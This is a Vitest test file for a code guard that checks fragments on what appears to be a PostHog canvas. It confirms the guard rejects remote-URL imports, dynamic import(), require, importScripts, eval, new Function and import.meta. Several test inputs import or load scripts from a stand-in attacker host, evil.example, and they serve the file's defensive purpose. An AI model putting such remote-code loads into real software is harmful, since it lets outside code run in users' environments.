import { describe, expect, it } from "vitest";
import { checkFragmentCode } from "./fragmentCodeGuard";

describe("checkFragmentCode", () => {
  it("accepts a fragment that imports only allowed modules", () => {
    const code = `import { ph, useSharedState } from "@posthog/canvas-sdk";
import { Button } from "@posthog/quill";
import { useEffect } from "react";

export default function Card() {
  return <Button>ok</Button>;
}`;
    expect(checkFragmentCode(code)).toEqual({ ok: true, violations: [] });
  });

  it.each([
    ['import evil from "https://evil.example/x.js";', "https://evil.example"],
    ['import evil from "https://esm.sh/left-pad@1.0.0";', "esm.sh"],
    ['import evil from "./sibling";', "./sibling"],
    ['export { x } from "node:fs";', "node:fs"],
  ])("rejects %s", (code, needle) => {
    const result = checkFragmentCode(code);
    expect(result.ok).toBe(false);
    expect(result.violations.join(" ")).toContain(needle);
  });

  it.each([
    ['const m = await import("https://evil.example/x.js");', "import()"],
    ['const m = require("fs");', "require()"],
    ['importScripts("https://evil.example/x.js");', "importScripts()"],
    ['eval("fetch(1)");', "eval()"],
    ['const f = new Function("return 1");', "new Function()"],
    ["const u = import.meta.url;", "import.meta"],
  ])("rejects %s", (code, reason) => {
    const result = checkFragmentCode(code);
    expect(result.ok).toBe(false);
    expect(result.violations).toContain(`${reason} is not allowed`);
  });

  it("reads prose and comments as text, not as code", () => {
    const code = `// import evil from "https://evil.example/x.js";
/* eval("no") */
import { ph } from "@posthog/canvas-sdk";

export default function Note() {
  const help = 'eval("no") and import("no")';
  return <p>Imported from "somewhere"</p>;
}`;
    expect(checkFragmentCode(code)).toEqual({ ok: true, violations: [] });
  });

  it("reads the code inside a template hole as code", () => {
    const hole = ["$", "{", 'eval("1")', "}"].join("");
    const code = `const x = \`value ${hole}\`;`;
    expect(checkFragmentCode(code).violations).toContain(
      "eval() is not allowed",
    );
  });

  it("finds the source of an import that spans lines", () => {
    const code = `import {
  AreaChart,
  XAxis,
} from "https://evil.example/recharts.js";`;
    expect(checkFragmentCode(code).ok).toBe(false);
  });
});
